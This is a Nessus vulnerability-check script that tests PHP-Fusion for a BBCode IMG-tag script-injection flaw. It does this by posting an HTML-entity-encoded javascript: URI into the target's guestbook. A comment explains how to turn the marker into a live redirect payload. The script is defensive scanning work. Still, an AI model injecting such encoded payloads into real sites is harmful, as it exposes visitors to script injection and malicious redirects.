#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(17302);
  script_version("$Revision: 1.2 $");

  script_cve_id("CAN-2005-0692");
  script_bugtraq_id(12751);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"14608");
  }

  name["english"] = "PHP-Fusion BBCode IMG Tag Script Injection Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running a version of PHP-Fusion that does not
sufficiently sanitize Javascript code.  Specifically, an attacker can
inject Javascript code that bypasses the filters in fusion_core.php by
HTML-encoding it.  This code will be executed in the context of a
user's browser when he/she views the malicious BBcode on the remote
host. 

Solution : Install PHP-Fusion 5.01 Service Pack or upgrade to a newer 
version when it becomes available.

Risk factor : Medium";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for BBCode IMG tag script injection vulnerability in PHP-Fusion";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "CGI abuses : XSS";
  script_family(english:family["english"]);

  script_dependencie("php_fusion_detect.nasl", "smtp_settings.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

if (safe_checks()) exit(0);

include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/php-fusion"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # To test, we'll add a message to the guestbook and include an "image".
  # 
  # nb: it's not clear how to do anything other than insert a Javascript
  #     pseudo-URI; arbitrary code doesn't seem to work. Still, the
  #     trick could be used to redirect users to third-party websites
  #     and cute tricks like that.
  name = "noone";
  from = get_kb_item("SMTP/headers/From");
  if (!from) from = "nobody@example.com";
  # nb: this is the HTML-encoded version of 'javascript:document.nessus="http://www.example.com/"'; eg,
  #     perl -MHTML::Entities -e 'print encode_entities("javascript:document.nessus=\"http://www.example.com/\"", "\000-\255"), "\n";'
  #     change 'nessus' to 'location' to actually add a redirect.
  image = "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#110;&#101;&#115;&#115;&#117;&#115;&#61;&quot;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#101;&#120;&#97;&#109;&#112;&#108;&#101;&#46;&#99;&#111;&#109;&#47;&quot;";
  # nb: and this is the url-encoded version; eg,
  #     perl -MURI::Escape -MHTML::Entities -e 'print uri_escape(encode_entities("javascript:document.nessus=\"http://www.example.com/\"", "\000-\255")), "\n";'
  ue_image = "%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23110%3B%26%23101%3B%26%23115%3B%26%23115%3B%26%23117%3B%26%23115%3B%26%2361%3B%26quot%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23119%3B%26%23119%3B%26%23119%3B%26%2346%3B%26%23101%3B%26%23120%3B%26%2397%3B%26%23109%3B%26%23112%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23109%3B%26%2347%3B%26quot%3B";

  postdata = string(
    "guest_name=", name, "&",
    "guest_email=", from, "&",
    "guest_weburl=&",
    "guest_webtitle=&",
    "guest_message=%5BIMG%5D", ue_image, "%5B%2FIMG%5D&",
    "guest_submit=Submit"
  );
  req = string(
    "POST ",  dir, "/guestbook.php HTTP/1.1\r\n",
    "Host: ", get_host_name(), "\r\n",
    "Content-Type: application/x-www-form-urlencoded\r\n",
    "Content-Length: ", strlen(postdata), "\r\n",
    "\r\n",
    postdata
  );
  res = http_keepalive_send_recv(port:port, data:req);
  if (res == NULL) exit(0);

  # If the HTML-encoded text came back, there's a problem.
  if (image >< res) security_warning(port);
}
